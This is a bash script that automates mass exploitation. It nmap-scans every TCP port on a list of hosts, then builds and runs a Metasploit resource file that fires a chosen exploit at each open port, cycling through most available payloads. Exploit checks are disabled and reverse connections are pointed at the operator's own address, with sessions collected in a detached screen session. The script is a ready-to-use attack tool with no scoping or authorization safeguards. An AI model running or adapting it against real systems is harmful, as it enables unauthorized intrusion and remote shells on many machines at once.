#!/bin/bash 
# 20230505 kirby


if [[ ! -f "$1" ]]
then
    echo "must supply file of hosts"
    exit
fi

if [[ "x$2" == 'x' ]]
then
    echo "must supply exploit"
    exit
fi

srvport=10005
#if [[ $srvport == 19999 ]]
#then
#    srvport=10000
#fi
while netstat -ant|grep LISTEN |grep ":$srvport " >/dev/null 2>&1
do
    let srvport++
done



#ngrepfile=$(eval mktemp).nmap
cmdfile="${1}.msfcmd"
report="${1}.report"
exploit=$2
lport=20000
myip=$(ip addr show dev $(ip route |awk '/default/ {print $5}'|head -1)|awk '/inet / {print $2}' |cut -d'/' -f1)
echo 'color false' > "$cmdfile"
BORDER='##################################################' 


function echoauxil()
{
    let lport++
    if [[ $lport == 65535 ]]
    then
        lport=20000
    fi
    while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
    do
        let lport++
    done


    echo "echo \"$BORDER\"" >> "$cmdfile"
    echo "echo 'TESTING $host:$port'" >> "$cmdfile"
    echo "use $exploit" >> "$cmdfile"
    echo "set RPORT $port" >> "$cmdfile"
    echo "set RHOSTS $host" >> "$cmdfile"
    echo "set RHOST $host" >> "$cmdfile"
    echo "set VERBOSE false" >> "$cmdfile"
    echo "set LPORT $lport" >> "$cmdfile"
    echo "set LHOST $myip" >> "$cmdfile"
    echo "set SRVPORT $srvport" >> "$cmdfile"
    echo "set SRVHOST $myip" >> "$cmdfile"
    echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
    echo "set SSL $SSL" >> "$cmdfile"
    echo "set ForceExploit True" >> "$cmdfile"
    echo "exploit -j" >> "$cmdfile"
    echo "sleep 0.5" >> "$cmdfile"

    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    #echo "sleep 1" >> "$cmdfile"
}


function echoexploit()
{
    for target in ${TARGETS[@]}
    do
        for payload in $(cat ${tempfile}-${target})
        do
            let lport++
            if [[ $lport == 65535 ]]
            then
                lport=20000
            fi
            while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
            do
                let lport++
            done
            while ! ncat -n -z $host $port >/dev/null 2>&1
            do
                let lport++
            done

            let srvport++
            while netstat -ant|grep LISTEN |grep ":$srvport " >/dev/null 2>&1
            do
                let srvport++
            done
    
    
            echo "echo \"$BORDER\"" >> "$cmdfile"
            echo "echo 'TESTING $host:$port'" >> "$cmdfile"
            echo "use $exploit" >> "$cmdfile"
            echo "set TARGET $target" >> "$cmdfile"
            echo "set PAYLOAD $payload" >> "$cmdfile"
            echo "set SSL $SSL" >> "$cmdfile"
            echo "set RPORT $port" >> "$cmdfile"
            echo "set RHOSTS $host" >> "$cmdfile"
            echo "set RHOST $host" >> "$cmdfile"
            echo "set VERBOSE false" >> "$cmdfile"
            echo "set LPORT $lport" >> "$cmdfile"
            echo "set LHOST $myip" >> "$cmdfile"
            echo "set SRVPORT $srvport" >> "$cmdfile"
            echo "set SRVHOST $myip" >> "$cmdfile"
            echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
            echo "set ForceExploit True" >> "$cmdfile"
            echo "set AutoCheck False" >> "$cmdfile"
            #echo "set AllowNoCleanup True" >> "$cmdfile"
            echo "exploit -j" >> "$cmdfile"
            echo "sleep 1" >> "$cmdfile"
        done
    done
    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    #echo "sleep 1" >> "$cmdfile"
}



shopt -s nocasematch
ngrepfile="${1}.ngrep"
nmapfile="${1}.nmap"
xmlfile="${1}.xml"
if [[ ! -f "$ngrepfile" ]]
then
    nmap -T4 -n --open -p T:1-65535 -sT -iL $1 -oG "$ngrepfile" -oN "$nmapfile" -oX "$xmlfile" >/dev/null 2>&1
fi

tempfile=$(mktemp)
for target in $(/usr/share/metasploit-framework/msfconsole -q -n -x \
    "use $exploit; show targets; exit -y" \
    |grep -E " [0-9][0-9]? " \
    |sed -e 's/.*\([0-9][0-9]*\).*/\1/g' )
do
    TARGETS[${#TARGETS[@]}]=$target
    touch ${tempfile}-${target}
    for payload in $(/usr/share/metasploit-framework/msfconsole -q -n -x \
        "use $exploit; set TARGET $target; show payloads; exit -y" \
        |sed -r 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g' \
        |awk '/payload\// {print $2}' \
        |grep -v 'generic/custom' \
        |grep -v 'ipv6' \
        |grep -v 'debug' \
        |grep -v 'chmod' \
        |grep -v 'tight_loop' \
        |grep -v 'adduser' \
        |grep -v 'custom' \
        |grep -v 'debug_trap' \
        |grep -v 'dllinject' \
        |grep -v 'dns_txt_query_exec' \
        |grep -v 'download_exec' \
        |grep -v 'format_all_drives' \
        |grep -v 'loadlibrary' \
        |grep -v 'messagebox' \
        |grep -v 'patchupdllinject' \
        |grep -v 'patchupmeterpreter' \
        |grep -v 'peinject' \
        |grep -v 'powershell_reverse_tcp_ssl' \
        |grep -v 'shell_bind_tcp_xpfw' \
        |grep -v 'shell_hidden_bind_tcp' \
        |grep -v 'speak_pwned' \
        |grep -v 'ssh' \
        |grep -v 'tight_loop' \
        |grep -v 'upexec' \
        |grep -v 'vncinject' \
        |grep -v 'bind_hidden_ipknock_tcp' \
        |grep -v 'bind_hidden_tcp' \
        |grep -v 'bind_ipv6_tcp' \
        |grep -v 'bind_ipv6_tcp_uuid' \
        |grep -v 'bind_named_pipe' \
        |grep -v 'bind_nonx_tcp' \
        |grep -v 'bind_tcp_rc4' \
        |grep -v 'interact' \
        |grep -v 'reverse_hop_http' \
        |grep -v 'reverse_http_proxy_pstore' \
        |grep -v 'reverse_https_proxy' \
        |grep -v 'reverse_ipv6_tcp' \
        |grep -v 'reverse_named_pipe' \
        |grep -v 'reverse_nonx_tcp' \
        |grep -v 'reverse_ord_tcp' \
        |grep -v 'reverse_tcp_allports' \
        |grep -v 'reverse_tcp_dns' \
        |grep -v 'reverse_tcp_rc4' \
        |grep -v 'reverse_tcp_rc4_dns' \
        |grep -v 'reverse_tcp_uuid' \
        |grep -v 'reverse_udp' \
        |grep -v 'reverse_winhttp' \
        |grep -v 'reverse_winhttps' \
        |grep -v 'payload/cmd/unix/bind_socat_udp' \
        |grep -v 'payload/cmd/unix/reverse_socat_udp' \
        |grep -v 'ssh/interact' )
    do
        echo $payload >> ${tempfile}-${target}
    done
done

for host in $(cat "$1" |sort -u |egrep -v '^$|#')
do
    IFS=$'\n'
    for line in $(grep " $host " $ngrepfile |egrep '\sPorts:\s' |sed -e 's/.*Ports: //')
    do   
        IFS=','
        for fields in $line
        do   
            portinfo=()
            IFS='/'
            for d in $fields
            do   
                portinfo[${#portinfo[@]}]="$d"
            done 
            IFS=$'\n'
            port="${portinfo[0]// /}"
            state=${portinfo[1]}
            protocol=${portinfo[2]}
            owner=${portinfo[3]}
            service=${portinfo[4]}
            rpc_info=${portinfo[5]}
            version=${portinfo[6]}

            if [[ $state =~ filtered ]]
            then 
                continue
            fi   

            if echo ''|timeout -k 5 5 openssl s_client -connect ${host}:${port} >/dev/null 2>&1
            then
                SSL='true'
            else
                SSL='false'
            fi

            if [[ $exploit =~ ^auxiliary/ ]]
            then
                echoauxil
            else
                echoexploit
            fi
        done
    done
done
#echo "exit" >> "$cmdfile"
for i in {1..60}
do
    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep 3" >> "$cmdfile"
done
echo "Running msf scan"
echo "Outputing to $report"
echo "View screen to monitor progress"
screen -O -dmS mkmsfexploit -L -Logfile "$report" /usr/share/metasploit-framework/msfconsole -q -n -r "$cmdfile"
screen -list 



for target in ${TARGETS[@]}
do
    ls ${tempfile}-${target}
done
